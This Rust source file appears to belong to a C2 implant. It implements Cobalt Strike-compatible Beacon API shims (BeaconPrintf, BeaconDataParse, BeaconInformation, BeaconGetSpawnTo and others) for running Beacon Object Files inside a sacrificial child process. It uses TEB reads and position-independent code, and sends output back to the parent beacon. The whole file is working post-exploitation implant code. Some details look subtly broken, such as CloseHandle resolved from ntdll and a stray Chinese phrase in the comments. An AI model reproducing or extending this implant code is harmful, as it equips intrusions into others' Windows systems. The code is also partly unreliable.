//! Beacon-API shims for the isolated BOF host.
//!
//! Same CS ABI surface as `crates/implant-tasks/src/bof.rs`, with the output
//! path swapped: instead of capturing into a static buffer, every formatted
//! fragment is written to the inherited stdout pipe via
//! `WriteFile(GetStdHandle(STD_OUTPUT_HANDLE))` — the parent beacon drains
//! the pipe to EOF and returns the bytes as `Response::BofOutput`.
//!
//! Dumper constraints honored here (see the crate root docs): no writable
//! statics (no capture buffer, no static args pointer — the
//! `BeaconDataParse(NULL, 0)` fallback reads the TEB slot the entry stashed),
//! and the shim table is a `match`, not a static of pointers.

use crate::export_addr;
use core::ffi::c_void;

/// `STD_OUTPUT_HANDLE` (GetStdHandle selector, (DWORD)-11).
const STD_OUTPUT_HANDLE: u32 = 0xFFFF_FFF5;

type GetStdHandleFn = unsafe extern "system" fn(u32) -> *mut c_void;
type WriteFileFn =
    unsafe extern "system" fn(*mut c_void, *const u8, u32, *mut u32, *mut c_void) -> i32;

/// Write `bytes` to the inherited stdout pipe (NtWriteFile over the
/// parent-provided stdout handle stashed in the TEB gs:[0x1788] slot — the
/// sacrificial child has no kernel32 to call GetStdHandle, but ntdll's
/// NtWriteFile works on the inherited handle value directly). Best-effort:
/// if the handle or the export can't be resolved (e.g. the blob was launched
/// without a redirected stdout), the fragment is dropped — output capture
/// must never crash the host.
unsafe fn out_write(bytes: &[u8]) {
    if bytes.is_empty() {
        return;
    }
    let handle: u64;
    core::arch::asm!(
        "mov {}, gs:[0x1788]",
        out(reg) handle,
        options(nostack, preserves_flags, readonly),
    );
    if handle == 0 {
        return;
    }
    let Some(wf_addr) = (unsafe { export_addr(b"ntdll.dll", b"NtWriteFile") }) else {
        return;
    };
    type NtWriteFileFn = unsafe extern "system" fn(
        *mut c_void, // FileHandle
        *mut c_void, // Event
        *mut c_void, // ApcRoutine
        *mut c_void, // ApcContext
        *mut u8,     // IoStatusBlock
        *const u8,   // Buffer
        u32,         // Length
        *mut c_void, // ByteOffset
        *mut u32,    // Key
    ) -> i32;
    let wf: NtWriteFileFn = unsafe { core::mem::transmute(wf_addr) };
    let mut io_status = [0u8; 16]; // IO_STATUS_BLOCK
    let _ = unsafe {
        wf(
            handle as *mut c_void,
            core::ptr::null_mut(),
            core::ptr::null_mut(),
            core::ptr::null_mut(),
            io_status.as_mut_ptr(),
            bytes.as_ptr(),
            bytes.len() as u32,
            core::ptr::null_mut(),
            core::ptr::null_mut(),
        )
    };
}

/// Write a single line/fragment to the pipe (crate-internal helper used by
/// the entry for loader diagnostics).
pub fn write_line(bytes: &[u8]) {
    unsafe { out_write(bytes) };
}

// ---- minimal varargs printf (%s, %d, %x, %c, %%) ----
//
// Same ABI contract as bof.rs: the CS ABI is C-calling-convention varargs;
// the varargs are modeled as EXPLICIT trailing args (a1..a6) which on Win64
// land in r8/r9 + the stack — exactly where a C vararg caller placed them.

/// CS Beacon callback type tags (subset). CALLBACK_ERROR prefixes "[error] ";
/// anything else is normal output.
const CALLBACK_ERROR: i32 = 0x0d;

unsafe fn format_into(fmt: &[u8], args: [u64; 6]) {
    let mut ai = 0usize;
    let mut i = 0usize;
    while i < fmt.len() {
        let c = fmt[i];
        if c != b'%' {
            unsafe { out_write(&[c]) };
            i += 1;
            continue;
        }
        i += 1;
        if i >= fmt.len() {
            unsafe { out_write(b"%") };
            break;
        }
        match fmt[i] {
            b's' => unsafe { format_push_str(args, &mut ai) },
            b'd' | b'i' => unsafe { format_push_int(args, &mut ai) },
            b'x' => unsafe { format_push_hex(args, &mut ai) },
            b'c' => unsafe { format_push_char(args, &mut ai) },
            b'%' => unsafe { out_write(b"%") },
            other => {
                // Unknown specifier: emit literally so the output is debuggable.
                unsafe { out_write(&[b'%', other]) };
            }
        }
        i += 1;
    }
}

/// `%s`: write a NUL-terminated string arg (bounded 4096 bytes).
unsafe fn format_push_str(args: [u64; 6], ai: &mut usize) {
    if *ai < args.len() {
        let p = args[*ai] as *const u8;
        if !p.is_null() {
            let mut len = 0usize;
            while unsafe { *p.add(len) } != 0 && len < 4096 {
                len += 1;
            }
            unsafe { out_write(core::slice::from_raw_parts(p, len)) };
        }
        *ai += 1;
    }
}

/// `%d` / `%i`: write a signed-decimal arg.
unsafe fn format_push_int(args: [u64; 6], ai: &mut usize) {
    if *ai < args.len() {
        let v = args[*ai] as i32;
        let mut buf = [0u8; 12];
        let s = itoa(v, &mut buf);
        unsafe { out_write(s.as_bytes()) };
        *ai += 1;
    }
}

/// `%x`: write a lowercase-hex arg.
unsafe fn format_push_hex(args: [u64; 6], ai: &mut usize) {
    if *ai < args.len() {
        let v = args[*ai] as u32;
        let mut buf = [0u8; 9];
        let s = utohex(v, &mut buf);
        unsafe { out_write(s.as_bytes()) };
        *ai += 1;
    }
}

/// `%c`: write a single-char arg.
unsafe fn format_push_char(args: [u64; 6], ai: &mut usize) {
    if *ai < args.len() {
        unsafe { out_write(&[args[*ai] as u8]) };
        *ai += 1;
    }
}

/// Signed-decimal into `buf`, returns the written slice.
fn itoa(mut v: i32, buf: &mut [u8; 12]) -> &str {
    // Handle i32::MIN specially to avoid overflow on negation.
    if v == i32::MIN {
        const MIN_STR: &[u8] = b"-2147483648";
        buf[..MIN_STR.len()].copy_from_slice(MIN_STR);
        return core::str::from_utf8(&buf[..MIN_STR.len()]).unwrap_or("");
    }
    let mut tmp = [0u8; 12];
    let mut n = 0usize;
    let neg = v < 0;
    if neg {
        v = -v;
    }
    if v == 0 {
        tmp[0] = b'0';
        n = 1;
    } else {
        while v != 0 {
            tmp[n] = b'0' + (v % 10) as u8;
            n += 1;
            v /= 10;
        }
    }
    let mut out = 0usize;
    if neg {
        buf[0] = b'-';
        out = 1;
    }
    for k in 0..n {
        buf[out + k] = tmp[n - 1 - k];
    }
    let end = out + n;
    core::str::from_utf8(&buf[..end]).unwrap_or("")
}

/// Lowercase hex into `buf`, returns the written slice (no leading 0x).
fn utohex(mut v: u32, buf: &mut [u8; 9]) -> &str {
    const HEX: &[u8; 16] = b"0123456789abcdef";
    let mut tmp = [0u8; 8];
    let mut n = 0usize;
    if v == 0 {
        tmp[0] = b'0';
        n = 1;
    } else {
        while v != 0 {
            tmp[n] = HEX[(v & 0xf) as usize];
            n += 1;
            v >>= 4;
        }
    }
    for k in 0..n {
        buf[k] = tmp[n - 1 - k];
    }
    core::str::from_utf8(&buf[..n]).unwrap_or("")
}

// ---- Beacon ABI functions (resolved by the loader as externals) ----
//
// `extern "C"` (the CS ABI is __cdecl = default on x64). `pub` so the crate
// root's shim_keepalive can form direct call edges to them.
//
// Every shim is `#[inline(never)]` — REQUIRED by the PIC dumper: the shims
// are reached by the BOF indirectly (address taken via `lea` in
// [`beacon_api_addr`]), so the crate root's `shim_keepalive` adds never-taken
// DIRECT call edges to keep them in the dumper's reachability closure. If a
// keepalive call were inlined, the address-taken out-of-line body would be
// left unreachable and the dumper would hard-fail with "reachable code
// references unreachable code". inline(never) pins one out-of-line body that
// both the direct edge and the `lea` target.

/// `void BeaconPrintf(int type, const char *fmt, ...)`.
/// Writes formatted output to the inherited stdout pipe.
#[no_mangle]
#[inline(never)] // see the dumper-closure note above
pub unsafe extern "C" fn BeaconPrintf(
    typ: i32,
    fmt: *const u8,
    a1: u64,
    a2: u64,
    a3: u64,
    a4: u64,
    a5: u64,
    a6: u64,
) {
    if fmt.is_null() {
        return;
    }
    // Read the C string up to NUL (cap at a sane length).
    let mut len = 0usize;
    while unsafe { *fmt.add(len) } != 0 && len < 1024 {
        len += 1;
    }
    let fmt_bytes = unsafe { core::slice::from_raw_parts(fmt, len) };
    if typ == CALLBACK_ERROR {
        unsafe { out_write(b"[error] ") };
    }
    unsafe { format_into(fmt_bytes, [a1, a2, a3, a4, a5, a6]) };
    unsafe { out_write(b"\n") };
}

/// `void BeaconOutput(int type, char *data, int len)`. Raw-blob sibling of
/// Printf; writes `data[0..len]` to the pipe.
#[no_mangle]
#[inline(never)] // see the dumper-closure note above
pub unsafe extern "C" fn BeaconOutput(_typ: i32, data: *const u8, len: i32) {
    if data.is_null() || len <= 0 {
        return;
    }
    unsafe { out_write(core::slice::from_raw_parts(data, len as usize)) };
}

/// CS `datap` parse state. We expose it as a plain struct the BOF stack-allocates.
#[repr(C)]
#[derive(Clone, Copy)]
pub struct DataParseState {
    pub original: *const u8,
    pub buffer: *const u8,
    pub size: i32,
    pub lengths: i32,
}

/// Recover the loader-provided args for `BeaconDataParse(NULL, 0)`: the entry
/// stashed the args pointer in the TEB `ArbitraryUserPointer` slot
/// (gs:[0x28]); the `args_len` u32 sits immediately before the args bytes.
/// (0, null) when the slot is empty.
unsafe fn teb_args() -> (*const u8, i32) {
    let p: usize;
    unsafe {
        core::arch::asm!(
            "mov {}, qword ptr gs:[0x28]",
            out(reg) p,
            options(nostack, preserves_flags, readonly),
        );
    }
    if p == 0 {
        return (core::ptr::null(), 0);
    }
    let len = unsafe { ((p as *const u8).sub(4) as *const i32).read_unaligned() };
    if len < 0 {
        return (core::ptr::null(), 0);
    }
    (p as *const u8, len)
}

/// `void BeaconDataParse(datap *parser, char *buffer, int size)`.
/// If `buffer` is NULL, default to the loader-provided args blob (TEB slot).
#[no_mangle]
#[inline(never)] // see the dumper-closure note above
pub unsafe extern "C" fn BeaconDataParse(d: *mut DataParseState, buffer: *const u8, size: i32) {
    if d.is_null() {
        return;
    }
    let (buf, sz) = if buffer.is_null() {
        unsafe { teb_args() }
    } else {
        (buffer, size)
    };
    unsafe {
        (*d).original = buf;
        (*d).buffer = buf;
        (*d).size = sz;
        (*d).lengths = 0;
    }
}

/// `char *BeaconDataExtract(datap *parser, int *size)`. Reads a u32 length then
/// that many bytes; advances the buffer cursor.
#[no_mangle]
#[inline(never)] // see the dumper-closure note above
pub unsafe extern "C" fn BeaconDataExtract(d: *mut DataParseState, size: *mut i32) -> *const u8 {
    if d.is_null() || unsafe { (*d).buffer.is_null() || (*d).original.is_null() } {
        if !size.is_null() {
            unsafe { *size = 0 };
        }
        return core::ptr::null();
    }
    let (consumed, left) = unsafe {
        (
            (*d).buffer as usize - (*d).original as usize,
            (*d).size - ((*d).buffer as usize - (*d).original as usize) as i32,
        )
    };
    if left < 4 {
        if !size.is_null() {
            unsafe { *size = 0 };
        }
        return core::ptr::null();
    }
    let len = unsafe { *((*d).buffer as *const i32) };
    if len < 0 {
        // Negative length is malformed (attacker-controlled i32).
        if !size.is_null() {
            unsafe { *size = 0 };
        }
        return core::ptr::null();
    }
    // Bounds check in usize to avoid i32 overflow (see bof.rs).
    let len_u = len as usize;
    let need = 4usize.saturating_add(len_u);
    if need > left as usize {
        if !size.is_null() {
            unsafe { *size = 0 };
        }
        return core::ptr::null();
    }
    let _ = consumed;
    unsafe {
        let p = (*d).buffer.add(4);
        (*d).buffer = p.add(len_u);
        if !size.is_null() {
            *size = len;
        }
        p
    }
}

/// `int BeaconGetInt(datap *parser)` — read a 4-byte LE int, advance.
#[no_mangle]
#[inline(never)] // see the dumper-closure note above
pub unsafe extern "C" fn BeaconGetInt(d: *mut DataParseState) -> i32 {
    if d.is_null() || unsafe { (*d).buffer.is_null() || (*d).original.is_null() } {
        return 0;
    }
    let left = unsafe { (*d).size - ((*d).buffer as usize - (*d).original as usize) as i32 };
    if left < 4 {
        return 0;
    }
    unsafe {
        let v = *((*d).buffer as *const i32);
        (*d).buffer = (*d).buffer.add(4);
        v
    }
}

/// `short BeaconGetShort(datap *parser)` — read a 2-byte LE short, advance.
#[no_mangle]
#[inline(never)] // see the dumper-closure note above
pub unsafe extern "C" fn BeaconGetShort(d: *mut DataParseState) -> i16 {
    if d.is_null() || unsafe { (*d).buffer.is_null() || (*d).original.is_null() } {
        return 0;
    }
    let left = unsafe { (*d).size - ((*d).buffer as usize - (*d).original as usize) as i32 };
    if left < 2 {
        return 0;
    }
    unsafe {
        let v = *((*d).buffer as *const i16);
        (*d).buffer = (*d).buffer.add(2);
        v
    }
}

/// `char *BeaconGetStr(datap *parser)` — read a NUL-terminated string, advance.
#[no_mangle]
#[inline(never)] // see the dumper-closure note above
pub unsafe extern "C" fn BeaconGetStr(d: *mut DataParseState) -> *const u8 {
    if d.is_null() || unsafe { (*d).buffer.is_null() || (*d).original.is_null() } {
        return core::ptr::null();
    }
    let left = unsafe { (*d).size - ((*d).buffer as usize - (*d).original as usize) as i32 };
    if left <= 0 {
        return core::ptr::null();
    }
    unsafe {
        let mut len = 0usize;
        while len < left as usize && *(*d).buffer.add(len) != 0 {
            len += 1;
            if len > 4096 {
                break;
            }
        }
        if len >= left as usize {
            return core::ptr::null();
        }
        let p = (*d).buffer;
        (*d).buffer = (*d).buffer.add(len + 1);
        p
    }
}

/// `int BeaconDataInt(datap *parser)` — alias of [`BeaconGetInt`].
#[no_mangle]
#[inline(never)] // see the dumper-closure note above
pub unsafe extern "C" fn BeaconDataInt(d: *mut DataParseState) -> i32 {
    unsafe { BeaconGetInt(d) }
}

/// `short BeaconDataShort(datap *parser)` — alias of [`BeaconGetShort`].
#[no_mangle]
#[inline(never)] // see the dumper-closure note above
pub unsafe extern "C" fn BeaconDataShort(d: *mut DataParseState) -> i16 {
    unsafe { BeaconGetShort(d) }
}

/// `int BeaconDataLength(datap *parser)` — bytes remaining in the buffer.
#[no_mangle]
#[inline(never)] // see the dumper-closure note above
pub unsafe extern "C" fn BeaconDataLength(d: *mut DataParseState) -> i32 {
    if d.is_null() || unsafe { (*d).buffer.is_null() || (*d).original.is_null() } {
        return 0;
    }
    unsafe { (*d).size - ((*d).buffer as usize - (*d).original as usize) as i32 }
}

/// `BOOL BeaconIsAdmin()` — the isolated host is a freshly spawned
/// sacrificial process inheriting the beacon's token; the full token check
/// (hostinfo) drags in cached-state statics the PIC dumper forbids, so the
/// isolated shim reports 0 (not admin). BOFs that gate on admin should run
/// inline, where the shim is exact. Documented受限交付 divergence.
#[no_mangle]
#[inline(never)] // see the dumper-closure note above
pub unsafe extern "C" fn BeaconIsAdmin() -> i32 {
    // Optimizer barrier: the constant body would be constant-folded through
    // the keepalive call (IPSCCP), deleting the direct edge the PIC dumper
    // needs — same trick as BeaconRevertToken, emits no code.
    core::hint::black_box(());
    0
}

/// `void BeaconRevertToken()` — documented no-op (same rationale as bof.rs).
#[no_mangle]
#[inline(never)] // see the dumper-closure note above
pub unsafe extern "C" fn BeaconRevertToken() {
    // Optimizer barrier: an observable NOP body lets LLVM delete the
    // keepalive's direct call as dead code, and the PIC dumper then loses
    // this out-of-line body (beacon_api_addr lea's it). black_box(()) emits
    // no instructions — it only makes the call un-eliminable.
    core::hint::black_box(());
}

/// `void BeaconCleanupProcess(PROCESS_INFORMATION *p)` — close hProcess +
/// hThread via the resolved CloseHandle (best-effort).
#[no_mangle]
#[inline(never)] // see the dumper-closure note above
pub unsafe extern "C" fn BeaconCleanupProcess(pi: *mut core::ffi::c_void) {
    if pi.is_null() {
        return;
    }
    // PROCESS_INFORMATION layout (Win64): HANDLE hProcess, hThread; DWORD pid, tid.
    type CloseHandle = unsafe extern "system" fn(*mut core::ffi::c_void) -> i32;
    if let Some(addr) = unsafe { export_addr(b"ntdll.dll", b"CloseHandle") } {
        let close: CloseHandle = unsafe { core::mem::transmute(addr) };
        let base = pi as *const usize;
        let (h_proc, h_thread) = unsafe { (*base, *base.add(1)) };
        if h_proc != 0 {
            let _ = unsafe { close(h_proc as *mut core::ffi::c_void) };
        }
        if h_thread != 0 {
            let _ = unsafe { close(h_thread as *mut core::ffi::c_void) };
        }
    }
}

/// CS `beaconInfo.version` tag (`BEACON_INFO_VERSION`).
const BEACON_INFO_VERSION: u32 = 1;

/// CS `beaconInfo` ABI (see bof.rs for the offset rationale + asserts).
#[repr(C)]
pub struct BeaconInfo {
    pub version: u32,       // 0x00 BEACON_INFO_VERSION (1)
    pub pid: u32,           // 0x04
    pub hostname: *mut u8,  // 0x08
    pub user: *mut u8,      // 0x10
    pub arch: u32,          // 0x18
    pub ip: *mut u8,        // 0x20
    pub bid: *mut u8,       // 0x28
    pub port: *mut u8,      // 0x30
    pub computer: *mut u8,  // 0x38
    pub magic: u32,         // 0x40
    pub unknown: u32,       // 0x44
    pub internal: u32,      // 0x48
    pub pid64: u32,         // 0x4C
    pub os: u32,            // 0x50
    pub arch_name: *mut u8, // 0x58
    pub osinfo: *mut u8,    // 0x60
    pub domain: *mut u8,    // 0x68
    pub spawn: *mut u8,     // 0x70
    pub ps1: *mut u8,       // 0x78
    pub pipename: *mut u8,  // 0x80
    pub isadmin: i32,       // 0x88 — BOOL, LAST field
}

// Same ABI guard as bof.rs: offsets must never drift.
const _: () = {
    assert!(core::mem::offset_of!(BeaconInfo, version) == 0x00);
    assert!(core::mem::offset_of!(BeaconInfo, pid) == 0x04);
    assert!(core::mem::offset_of!(BeaconInfo, isadmin) == 0x88);
    assert!(core::mem::size_of::<BeaconInfo>() == 0x90);
};

/// `void BeaconInformation(beaconInfo *info)` — isolated-host subset: fills
/// `version` + `pid` (via GetCurrentProcessId) and zeroes the rest. The
/// hostname/user scratch C-strings bof.rs keeps in writable statics are
/// omitted here (dumper forbids writable data) — CS's contract treats null
/// fields as "not provided".
#[no_mangle]
#[inline(never)] // see the dumper-closure note above
pub unsafe extern "C" fn BeaconInformation(info: *mut BeaconInfo) {
    if info.is_null() {
        return;
    }
    unsafe {
        core::ptr::write_bytes(info, 0, 1);
        (*info).version = BEACON_INFO_VERSION;
        // No kernel32 in the sacrificial child (loader never ran): read the
        // process id straight from the TEB ClientId (gs:[0x40]).
        let pid: u64;
        core::arch::asm!(
            "mov {}, gs:[0x40]",
            out(reg) pid,
            options(nostack, preserves_flags, readonly),
        );
        (*info).pid = pid as u32;
    }
}

/// Value returned by [`BeaconGetSpawnTo`]. A `static` (not a `const` or
/// string literal): mergeable string constants make LLVM emit an anchor
/// thunk in .text that the PIC dumper's reachability walk can't cover,
/// failing the blob relayout gate.
static SPAWN_TO_VALUE: [u8; 8] = *b"cmd.exe\0";

/// `char *BeaconGetSpawnTo(BOOL x86)` — the path a BOF should use when it
/// spawns its next process. Value matches bof.rs ("cmd.exe"). Returns a
/// READ-ONLY pointer (see [`beacon_api_addr`] doc): the isolated host has no
/// writable statics, and a BOF writing into the buffer faults inside the
/// sacrificial child — contained by B3.
#[no_mangle]
#[inline(never)] // see the dumper-closure note above
pub unsafe extern "C" fn BeaconGetSpawnTo(_x86: i32) -> *mut u8 {
    // Optimizer barrier (same rationale as BeaconIsAdmin).
    core::hint::black_box(());
    SPAWN_TO_VALUE.as_ptr() as *mut u8
}

/// Map a Beacon-API external name to the address of our Rust shim. `match`,
/// not a static table — a static of fn pointers would emit base relocations
/// the raw blob can't fix up (dumper hard error).
///
/// Divergences vs bof.rs (documented受限交付): `BeaconGetSpawnTo` returns a
/// READ-ONLY .rdata string (bof.rs returns a writable scratch buffer) — the
/// isolated host has no writable statics (PIC dumper gate); a BOF that
/// writes into the returned buffer faults INSIDE the sacrificial child,
/// where B3 contains it. `BeaconIsAdmin` reports 0 (see its doc). Every
/// other shim matches the inline semantics.
pub fn beacon_api_addr(name: &str) -> Option<u64> {
    /// fn-item → u64 address (see bof.rs for the coercion trick).
    fn addr_of(f: *const ()) -> u64 {
        f as u64
    }
    let addr: u64 = match name {
        "BeaconPrintf" => addr_of(BeaconPrintf as *const ()),
        "BeaconOutput" => addr_of(BeaconOutput as *const ()),
        "BeaconDataParse" => addr_of(BeaconDataParse as *const ()),
        "BeaconDataExtract" => addr_of(BeaconDataExtract as *const ()),
        "BeaconGetInt" => addr_of(BeaconGetInt as *const ()),
        "BeaconGetShort" => addr_of(BeaconGetShort as *const ()),
        "BeaconGetStr" => addr_of(BeaconGetStr as *const ()),
        "BeaconDataInt" => addr_of(BeaconDataInt as *const ()),
        "BeaconDataShort" => addr_of(BeaconDataShort as *const ()),
        "BeaconDataLength" => addr_of(BeaconDataLength as *const ()),
        "BeaconIsAdmin" => addr_of(BeaconIsAdmin as *const ()),
        "BeaconGetSpawnTo" => addr_of(BeaconGetSpawnTo as *const ()),
        "BeaconRevertToken" => addr_of(BeaconRevertToken as *const ()),
        "BeaconCleanupProcess" => addr_of(BeaconCleanupProcess as *const ()),
        "BeaconInformation" => addr_of(BeaconInformation as *const ()),
        _ => return None,
    };
    Some(addr)
}
